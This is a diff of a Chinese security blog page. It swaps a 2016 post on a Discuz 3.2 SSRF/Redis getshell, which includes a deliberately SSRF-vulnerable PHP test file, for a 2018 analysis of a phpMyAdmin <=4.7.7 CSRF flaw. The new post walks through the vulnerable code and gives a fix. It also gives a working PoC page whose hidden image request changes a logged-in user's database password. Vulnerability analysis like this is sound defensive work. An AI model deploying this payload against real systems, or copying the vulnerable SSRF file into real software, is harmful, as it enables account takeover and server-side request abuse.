@@ -15,7 +15,7 @@
     <meta name="description" content="Some Lucifaer's security researchers and security analysis">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite） · Lucifaer&#39;s Blog</title>
+    <title>phpMyAdmin &lt;= 4.7.7 CSRF分析 · Lucifaer&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -225,7 +225,7 @@
                 <a href="/" >Lucifaer&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）</a>
+                <a href="#" class="post-name">phpMyAdmin <= 4.7.7 CSRF分析</a>
             </div>
     </div>
     
@@ -257,7 +257,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）
+            phpMyAdmin 
             <!-- 404 -->
             
         </h1>
@@ -284,12 +284,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">734</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">579</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2016/07/01</span>
+                    <span class="post-intro-time">2018/08/30</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -413,35 +413,37 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr>
-<p>好久没有更新blog了，一来是考试月的原因，另一来是在尝试通过Discuz 3.2的漏洞利用分析来编写自己的poc(基于pocsuite)——主要目的还是练习自己python的编写能力。<br>不多废话，直接上干货。</p>
+        <p>同样也是一个鸡肋漏洞，产生原因在<code>Common.inc.php</code>核心类，感觉漏洞发现者是捡了一个漏洞…</p>
 <a id="more"></a>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><hr>
-<p>在安全智库上有一片详尽的文章：<a href="http://mp.weixin.qq.com/s?__biz=MzI0NjQxODg0Ng==&amp;mid=2247483798&amp;idx=1&amp;sn=65cdf852dffd63b9d4ec41c31d9a5365&amp;scene=23&amp;srcid=0617Fv53mYLaSNhYGZtceh0w#rd" target="_blank" rel="noopener">Discuz利用ssrf+缓存应用getshell漏洞分析</a>，讲解的很详尽，简单来说，就是通过ssrf来操作redis，更改了全局变量的值，初始化时会把缓存内容加入全局变量，导致任意代码执行。</p>
-<h1 id="关于环境的配置"><a href="#关于环境的配置" class="headerlink" title="关于环境的配置"></a>关于环境的配置</h1><hr>
-<p>我是在kali rolling下搭建的，至于apache+php+mysql的安装就不说了，在这个环境中，我们需要安装redis或者memcache，我选择的是redis。同时我们需要安装phpredis扩展(2.28版本支持性比较好)。</p>
-<h2 id="phpredis的安装"><a href="#phpredis的安装" class="headerlink" title="phpredis的安装"></a>phpredis的安装</h2><p>在安装phpredis的过程中，还是比较麻烦的，下面来说一下(由于kali下默认安装的是php5，所以以下均为phpredis在php5上的安装过程)：<br>方法取自于<a href="https://anton.logvinenko.name/en/blog/how-to-install-redis-and-redis-php-client.html" target="_blank" rel="noopener">国外这哥们的文章</a>，但是其中还是有一些错误的:</p>
-<h3 id="首先安装请求包："><a href="#首先安装请求包：" class="headerlink" title="首先安装请求包："></a>首先安装请求包：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php5-dev</span><br></pre></td></tr></table></figure>
-<h3 id="下载phpredis："><a href="#下载phpredis：" class="headerlink" title="下载phpredis："></a>下载phpredis：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget https://github.com/phpredis/phpredis/archive/master.zip -O phpredis.zip</span><br></pre></td></tr></table></figure>
-<h3 id="解压，编译，安装phpredis："><a href="#解压，编译，安装phpredis：" class="headerlink" title="解压，编译，安装phpredis："></a>解压，编译，安装phpredis：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -o /tmp/phpredis.zip &amp;&amp; mv /tmp/phpredis-* /tmp/phpredis &amp;&amp; cd /tmp/phpredis &amp;&amp; phpize &amp;&amp; ./configure &amp;&amp; make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>
-<h3 id="在php5中添加phpredis的扩展："><a href="#在php5中添加phpredis的扩展：" class="headerlink" title="在php5中添加phpredis的扩展："></a>在php5中添加phpredis的扩展：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /etc/php5/mods-available/redis.ini &amp;&amp; echo extension=redis.so &gt; /etc/php5/mods-available/redis.ini</span><br><span class="line">sudo ln -s /etc/php5/mods-available/redis.ini /etc/php5/apache2/conf.d/</span><br><span class="line">sudo ln -s /etc/php/mods-available/redis.ini /etc/php/7.0/fpm/conf.d/redis.ini</span><br><span class="line">sudo ln -s /etc/php5/mods-available/redis.ini /etc/php5/cli/conf.d/</span><br></pre></td></tr></table></figure>
-<p>重启apache就安装好了。</p>
-<h2 id="安装curl扩展包："><a href="#安装curl扩展包：" class="headerlink" title="安装curl扩展包："></a>安装curl扩展包：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php5.0-curl</span><br></pre></td></tr></table></figure>
-<h2 id="对于Discuz的配置："><a href="#对于Discuz的配置：" class="headerlink" title="对于Discuz的配置："></a>对于Discuz的配置：</h2><p>在Discuz的config目录中，更改config_global_default.php中：<br><img src="http://139.129.31.35/usr/uploads/2016/07/919599632.png" alt="Discuz_config的配置"></p>
-<h2 id="开启redis服务："><a href="#开启redis服务：" class="headerlink" title="开启redis服务："></a>开启redis服务：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service redis-server start</span><br></pre></td></tr></table></figure>
-<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p>由于目前Discuz爆出的ssrf拥有较大的局限性，我们不能直接利用这个ssrf来执行我们的命令，为了复现此环境，我们在Discuz根目录下写了一个有ssrf漏洞的ssrf_gopher.php文件，文件内容如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;welcome to this page &lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h5&gt;it's just used to verify the bug&lt;/h5&gt;"</span>;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">$url = $_REQUEST[<span class="string">'ssrf'</span>];</span><br><span class="line"><span class="keyword">echo</span> $url.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">print_r($output);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>以上就是环境的配置。</p>
-<h1 id="Pocsuite框架使用poc："><a href="#Pocsuite框架使用poc：" class="headerlink" title="Pocsuite框架使用poc："></a>Pocsuite框架使用poc：</h1><p>这里我已经写好了基于pocsuite框架的poc：<br><a href="https://github.com/Lucifaer/pocsuite.git" target="_blank" rel="noopener">poc</a><br>在本机中下载pocsuite，根据使用说明运行即可。</p>
-<h1 id="使用dockerfile一键搭建复现环境："><a href="#使用dockerfile一键搭建复现环境：" class="headerlink" title="使用dockerfile一键搭建复现环境："></a>使用dockerfile一键搭建复现环境：</h1><p>如果你安装有docker，那么复现该环境就很方便了，我已经写好了dockerfile，你可以在你的docker中快速的搭建该环境，并进行测试：<br><a href="https://github.com/Lucifaer/pocsuite.git" target="_blank" rel="noopener">dockerfile</a><br>参照使用说明，执行相应的命令即可。</p>
+<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>本周在Twitter上有一个较为热点的讨论话题，是有关phpMyAdmin &lt;=4.7.7版本的一个CSRF漏洞，漏洞存在于<code>common.inc.php</code>中，而笔者分析完后，发现这个更像是漏洞作者捡漏的一个漏洞。</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>phpMyAdmin &lt;= 4.7.7</p>
+<h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>本文用phpMyAdmin 4.7.6进行分析。</p>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>直接看漏洞本质，主要在于两个点：</p>
+<p>首先是位于<code>libraries/common.inc.php</code>中第375行到389行这一段代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (PMA_isValid($_POST[<span class="string">'token'</span>])) &#123;</span><br><span class="line">        $token_provided = <span class="keyword">true</span>;</span><br><span class="line">        $token_mismatch = ! @hash_equals($_SESSION[<span class="string">' PMA_token '</span>], $_POST[<span class="string">'token'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($token_mismatch) &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * We don't allow any POST operation parameters if the token is mismatched</span></span><br><span class="line"><span class="comment">         * or is not provided</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $whitelist = <span class="keyword">array</span>(<span class="string">'ajax_request'</span>);</span><br><span class="line">        PMA\libraries\Sanitize::removeRequestVars($whitelist);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>有个关键点：如果发送的请求是<code>GET</code>请求，就可以绕过对于参数的检测。</p>
+<p>其次，第二个漏洞触发的关键点在<code>sql.php</code>第72行到76行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_GET[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这边可以直接接受外部<code>GET</code>请求的参数，在190行到199行处直接执行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($goto == <span class="string">'sql.php'</span>) &#123;</span><br><span class="line">    $is_gotofile = <span class="keyword">false</span>;</span><br><span class="line">    $goto = <span class="string">'sql.php'</span> . URL::getCommon(</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'db'</span> =&gt; $db,</span><br><span class="line">            <span class="string">'table'</span> =&gt; $table,</span><br><span class="line">            <span class="string">'sql_query'</span> =&gt; $sql_query</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>如上所说，我们只需要构造一个页面该页面在用户点击的时候自动发一个<code>GET</code>请求就ok了。</p>
+<p>我在漏洞利用这边举一个利用csrf修改当前用户密码的例子。</p>
+<p>构造一个HTML：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>POC TEST<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://localhost:8888/sql.php?db=mysql&amp;table=user&amp;sql_query=SET password = PASSWORD('vul_test')"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>之后诱导已经登录phpMyAdmin的用户访问，当前用户的密码就已经改为<code>vul_test</code>了。</p>
+<h1 id="0x04-修复方法"><a href="#0x04-修复方法" class="headerlink" title="0x04 修复方法"></a>0x04 修复方法</h1><p>最简单的修补方式就是将<code>sql.php</code>中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_GET[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>改成：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同样，直接更新到最新版是更好的方法。</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://lucifaer.com">Lucifaer</a>
-            <p>原文链接: <a href="https://lucifaer.com/2016/07/01/Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）/">https://lucifaer.com/2016/07/01/Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）/</a>
-            <p>发表日期: <a href="https://lucifaer.com/2016/07/01/Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）/">July 1st 2016, 11:41:00 pm</a>
+            <p>原文链接: <a href="https://lucifaer.com/2018/08/30/phpMyAdmin <= 4.7.7 CSRF分析/">https://lucifaer.com/2018/08/30/phpMyAdmin <= 4.7.7 CSRF分析/</a>
+            <p>发表日期: <a href="https://lucifaer.com/2018/08/30/phpMyAdmin <= 4.7.7 CSRF分析/">August 30th 2018, 8:01:00 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -449,13 +451,13 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2016/08/09/IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）/" title= IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174） >
-                    <div class="nextTitle">IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）</div>
-                </a>
-            
         </li>
         <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/08/29/Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)/" title= Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729) >
+                    <div class="prevTitle">Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)</div>
+                </a>
             
         </li>
     </ul>
@@ -588,7 +590,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#关于环境的配置"><span class="toc-number">3.</span> <span class="toc-text">关于环境的配置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#phpredis的安装"><span class="toc-number">3.1.</span> <span class="toc-text">phpredis的安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#首先安装请求包："><span class="toc-number">3.1.1.</span> <span class="toc-text">首先安装请求包：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#下载phpredis："><span class="toc-number">3.1.2.</span> <span class="toc-text">下载phpredis：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解压，编译，安装phpredis："><span class="toc-number">3.1.3.</span> <span class="toc-text">解压，编译，安装phpredis：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在php5中添加phpredis的扩展："><span class="toc-number">3.1.4.</span> <span class="toc-text">在php5中添加phpredis的扩展：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装curl扩展包："><span class="toc-number">3.2.</span> <span class="toc-text">安装curl扩展包：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#对于Discuz的配置："><span class="toc-number">3.3.</span> <span class="toc-text">对于Discuz的配置：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开启redis服务："><span class="toc-number">3.4.</span> <span class="toc-text">开启redis服务：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注意："><span class="toc-number">3.5.</span> <span class="toc-text">注意：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pocsuite框架使用poc："><span class="toc-number">4.</span> <span class="toc-text">Pocsuite框架使用poc：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#使用dockerfile一键搭建复现环境："><span class="toc-number">5.</span> <span class="toc-text">使用dockerfile一键搭建复现环境：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-漏洞简述"><span class="toc-number">1.</span> <span class="toc-text">0x00 漏洞简述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞信息"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞影响版本"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞影响版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞复现"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-修复方法"><span class="toc-number">5.</span> <span class="toc-text">0x04 修复方法</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
